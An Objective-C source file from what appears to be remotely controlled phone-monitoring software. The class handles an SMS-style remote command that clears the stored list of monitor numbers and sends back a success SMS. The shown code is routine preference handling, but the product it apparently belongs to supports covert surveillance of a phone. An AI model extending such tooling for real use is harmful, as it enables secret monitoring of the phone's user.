
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearCISNNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearCISNumbersProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface ClearCISNumbersProcessor (PrivateAPI)
- (void) processClearCISNumbers;
- (void) sendReplySMS;
@end

@implementation ClearCISNumbersProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearCISNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(ClearCISNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearCISNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearMonitorsProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearCISNumbersProcessor--->doProcessingCommand")
 	[self processClearCISNumbers];
}

#pragma mark ClearCISNumbersProcessor PrivateAPI Methods

/**
 - Method name: processClearCISNumbers
 - Purpose:This method is used to process clear CIS Numbers
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearCISNumbers {
	DLog (@"ClearCISNumbersProcessor--->processClearMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSMutableArray *cisNumbersArray=[[NSMutableArray alloc] init];
	[prefMonitor setMMonitorNumbers:cisNumbersArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[cisNumbersArray release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearCISNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
